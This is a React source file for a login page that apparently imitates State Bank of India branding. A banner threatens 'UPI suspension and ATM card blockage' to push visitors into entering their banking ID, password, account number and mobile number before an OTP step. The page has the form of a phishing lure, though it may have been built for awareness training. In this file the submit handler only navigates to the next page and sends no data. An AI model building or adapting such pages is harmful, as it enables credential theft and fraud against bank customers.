import React, { useState } from 'react';
import { User, Lock, Smartphone, CreditCard, Eye, EyeOff, ShieldCheck, AlertCircle } from 'lucide-react';
import WarningBanner from '../components/WarningBanner';
import { motion } from 'framer-motion';
import { useSecureNavigate } from './DeviceVerification';
import Captcha from '../components/Captcha';
import SecurityBadges from '../components/SecurityBadges';

const LoginPage: React.FC = () => {
  const secureNavigate = useSecureNavigate();
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    secureNavigate('/verify-otp');
  };

  return (
    <div className="flex flex-col min-h-[calc(100vh-140px)]">
      <WarningBanner message="SECURITY UPGRADE REQUIRED: Authenticate your credentials to prevent temporary UPI suspension and ATM card blockage." />
      
      <div className="max-w-md mx-auto px-4 py-12 w-full flex-1">
        <motion.div 
          initial={{ opacity: 0, scale: 0.98 }}
          animate={{ opacity: 1, scale: 1 }}
          className="glass-card p-0 border-b-8 border-b-sbi-blue overflow-hidden"
        >
          <div className="bg-sbi-blue p-8 text-white text-center">
            <div className="bg-white/20 w-12 h-12 rounded-2xl flex items-center justify-center mx-auto mb-4">
              <Lock className="w-6 h-6 text-white" />
            </div>
            <h2 className="text-2xl font-black uppercase tracking-tight">Portal Login</h2>
            <p className="text-[10px] text-sbi-light-blue font-black uppercase tracking-widest mt-1">256-bit Encrypted Session</p>
          </div>

          <div className="p-8">
            <div className="flex items-start gap-3 p-4 bg-blue-50 border border-blue-100 rounded-2xl mb-8">
                <AlertCircle className="w-5 h-5 text-sbi-blue shrink-0 mt-0.5" />
                <p className="text-[11px] text-blue-900 font-bold leading-relaxed">
                    To protect your account, we are using an <span className="text-sbi-blue">Advanced Identity Verification</span> protocol. Please enter your registered credentials exactly as provided in your passbook.
                </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-1.5">
                <label className="text-[11px] font-bold text-gray-600 uppercase ml-1 tracking-wider">Customer ID / Username</label>
                <div className="relative">
                  <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4.5 h-4.5 text-gray-400" />
                  <input 
                    type="text" 
                    placeholder="Internet Banking ID"
                    className="input-field pl-12 h-13"
                    required
                  />
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-[11px] font-bold text-gray-600 uppercase ml-1 tracking-wider">Login Password</label>
                <div className="relative">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-4.5 h-4.5 text-gray-400" />
                  <input 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Enter Password"
                    className="input-field pl-12 pr-12 h-13"
                    required
                  />
                  <button 
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-sbi-blue"
                  >
                    {showPassword ? <EyeOff className="w-4.5 h-4.5" /> : <Eye className="w-4.5 h-4.5" />}
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1.5">
                    <label className="text-[11px] font-bold text-gray-600 uppercase ml-1 tracking-wider">Account No.</label>
                    <div className="relative">
                        <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                        <input 
                            type="text" 
                            placeholder="Last 11 digits"
                            className="input-field pl-11 h-13 text-sm"
                            required
                            pattern="\d{11}"
                            maxLength={11}
                        />
                    </div>
                </div>
                <div className="space-y-1.5">
                    <label className="text-[11px] font-bold text-gray-600 uppercase ml-1 tracking-wider">Registered Mobile</label>
                    <div className="relative">
                        <Smartphone className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                        <input 
                            type="tel" 
                            placeholder="Mobile No."
                            className="input-field pl-11 h-13 text-sm"
                            required
                            pattern="\d{10}"
                            maxLength={10}
                        />
                    </div>
                </div>
              </div>

              <Captcha />

              <div className="pt-4">
                <button type="submit" className="btn-primary w-full py-4 font-black text-base shadow-2xl shadow-sbi-blue/30 group">
                  <ShieldCheck className="w-5 h-5 group-hover:scale-110 transition-transform" />
                  AUTHENTICATE & PROCEED
                </button>
              </div>
            </form>

            <SecurityBadges />

            <div className="mt-6 text-center border-t border-gray-100 pt-6">
              <div className="flex items-center justify-center gap-4 text-[10px] font-bold text-gray-400 uppercase tracking-widest">
                <a href="#" className="hover:text-sbi-blue">New User? Register</a>
                <span className="w-1 h-1 bg-gray-200 rounded-full"></span>
                <a href="#" className="hover:text-sbi-blue">Help Desk</a>
              </div>
            </div>
          </div>
        </motion.div>
      </div>
    </div>
  );
};

export default LoginPage;
